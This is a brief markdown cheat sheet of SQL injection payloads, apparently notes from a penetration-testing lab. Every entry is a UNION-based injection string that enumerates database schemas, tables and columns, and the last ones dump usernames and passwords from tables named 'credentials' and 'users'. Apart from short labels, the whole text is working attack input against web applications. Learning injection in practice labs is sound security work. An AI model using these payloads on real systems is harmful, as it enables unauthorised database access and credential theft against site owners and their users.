## Payloads

- To know available databases and their names
  > ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

- To know available tables in particular database (in this case 'dev')
  > cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

- To know availabe columns in a particular table (in this case 'credentials')
  > cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

- To dump data
  > cn' UNION select 1, username, password, 4 from dev.credentials-- -

cn' UNION select 1, username, password, 4 from ilfreight.users-- -
